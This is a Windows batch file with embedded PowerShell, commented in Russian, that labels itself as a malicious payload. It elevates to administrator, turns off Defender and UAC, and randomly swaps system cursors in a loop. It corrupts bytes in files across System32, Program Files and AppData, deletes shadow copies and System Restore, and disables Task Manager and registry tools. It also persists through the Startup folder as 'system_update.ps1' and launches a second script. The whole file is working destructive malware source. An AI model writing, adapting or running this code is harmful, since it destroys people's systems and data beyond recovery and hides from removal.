@echo off
:: Запуск PowerShell с правами администратора и выполнение встроенного кода
powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"& { Invoke-Expression (Get-Content -Raw '%~f0' | Select-Object -Skip 7) }\"'"
exit /b

# Здесь начинается PowerShell код
# ========== ВРЕДОНОСНАЯ ОСНОВА ==========

# 1. Отключение Defender и UAC
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force

# 2. Хаос с курсорами (фоновая задача)
$cursorJob = Start-Job -ScriptBlock {
    while ($true) {
        $cursorsPath = "$env:SystemRoot\Cursors"
        $cursorFiles = Get-ChildItem -Path $cursorsPath -Include *.cur,*.ani -Recurse -ErrorAction SilentlyContinue
        $cursorNames = @("Arrow","Wait","AppStarting","Help","IBeam","No","SizeNS","SizeWE","SizeNWSE","SizeNESW","SizeAll","UpArrow")
        if ($cursorFiles.Count -gt 0) {
            $randomCursor = $cursorFiles | Get-Random
            foreach ($name in $cursorNames) {
                Set-ItemProperty -Path "HKCU:\Control Panel\Cursors" -Name $name -Value $randomCursor.FullName -ErrorAction SilentlyContinue
            }
            Add-Type -MemberDefinition @'
[DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
'@ -Name "CursorUpdater" -Namespace Win32 -PassThru | Out-Null
            [Win32.CursorUpdater]::SystemParametersInfo(0x0057, 0, 0, 0x01 | 0x02) 2>$null
        }
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
    }
}

# 3. Повреждение файлов (изменение байтов)
function Corrupt-Files {
    param([string]$Path, [int]$Depth=0, [int]$MaxDepth=3)
    if ($Depth -gt $MaxDepth) { return }
    Get-ChildItem -Path $Path -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        Corrupt-Files -Path $_.FullName -Depth ($Depth+1) -MaxDepth $MaxDepth
    }
    Get-ChildItem -Path $Path -File -ErrorAction SilentlyContinue | Where-Object {
        $_.Extension -match '\.(exe|dll|sys|bat|cmd|ps1|vbs|docx|xlsx|pptx|pdf|jpg|png|mp3|mp4|zip|rar|7z|bak|reg|ini|config)$' -or $_.Length -lt 50MB
    } | ForEach-Object {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
            if ($bytes.Length -eq 0) { return }
            $corruptPercent = Get-Random -Minimum 10 -Maximum 31
            $numBytesToCorrupt = [math]::Floor($bytes.Length * $corruptPercent / 100)
            for ($i=0; $i -lt $numBytesToCorrupt; $i++) {
                $pos = Get-Random -Minimum 0 -Maximum $bytes.Length
                $bytes[$pos] = Get-Random -Minimum 0 -Maximum 256
            }
            [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
        } catch {}
    }
}

# Запускаем повреждение в фоне для системных папок
$corruptJob1 = Start-Job -ScriptBlock { param($p) Corrupt-Files -Path $p } -ArgumentList "$env:SystemRoot\System32"
$corruptJob2 = Start-Job -ScriptBlock { param($p) Corrupt-Files -Path $p } -ArgumentList "$env:SystemRoot\SysWOW64"
$corruptJob3 = Start-Job -ScriptBlock { param($p) Corrupt-Files -Path $p } -ArgumentList "$env:ProgramFiles"
$corruptJob4 = Start-Job -ScriptBlock { param($p) Corrupt-Files -Path $p } -ArgumentList "$env:ProgramFiles(x86)"
$corruptJob5 = Start-Job -ScriptBlock { param($p) Corrupt-Files -Path $p } -ArgumentList "$env:APPDATA"
$corruptJob6 = Start-Job -ScriptBlock { param($p) Corrupt-Files -Path $p } -ArgumentList "$env:LOCALAPPDATA"

# 4. Уничтожение теневых копий
Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }
Disable-ComputerRestore -Drive "C:\"
vssadmin delete shadows /all /quiet

# 5. Блокировка инструментов диагностики
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1 -Force

# 6. Закрепление в автозагрузке
$scriptContent = Get-Content $PSCommandPath -Raw
$dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_update.ps1"
$scriptContent | Out-File -FilePath $dest -Force

# 7. Запуск dead.ps1 (ищем в папке скрипта)
$deadScriptPath = Join-Path (Split-Path $MyInvocation.MyCommand.Path -Parent) "dead.ps1"
if (Test-Path $deadScriptPath) {
    powershell -File $deadScriptPath
} else {
    Write-Host "dead.ps1 не найден в текущей папке!" -ForegroundColor Red
}

# Бесконечное ожидание (чтобы фоновые задания не завершились)
while ($true) { Start-Sleep -Seconds 3600 }
